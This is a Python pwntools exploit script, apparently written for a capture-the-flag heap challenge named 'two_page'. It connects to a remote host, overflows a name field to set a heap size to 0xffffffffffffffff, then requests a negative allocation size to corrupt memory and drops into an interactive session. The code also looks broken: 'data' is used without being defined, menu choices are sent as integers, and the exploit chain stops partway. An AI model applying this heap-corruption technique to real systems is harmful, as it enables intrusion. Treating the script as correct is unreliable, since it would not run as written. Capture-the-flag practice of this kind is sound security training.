#!/usr/bin/env python
from pwn import *

# 

host , port = 'ctf.yuawn.idv.tw' , 10206
y = remote( host , port )


context.arch = 'amd64'

e , l = ELF('./two_page') , ELF('./libc.so.6')

def add( size , data ):
    y.sendafter( 'ice:' , 1 )
    y.sendafter( ':' , str( size ) )
    y.sendafter( ':' , data )

def sho( idx ):
    y.sendafter( 'ice:' , 3 )
    y.sendafter( 'x:' , str( idx ) )

def edt( idx , data ):
    y.sendafter( 'ice:' , 2 )
    y.sendafter( 'x:' , str( idx ) )
    y.sendafter( ':' , data )

def name( data ):
    y.sendafter( 'ice:' , 4 )
    y.sendafter( '?' , data )


add( 100 , 'a' )

name( 'D' * 0x18 + p64( 0xffffffffffffffff ) )

y.sendafter( 'ice:' , 1 )
y.sendafter( ':' , '-224' )
y.sendafter( ':' , data )

y.interactive()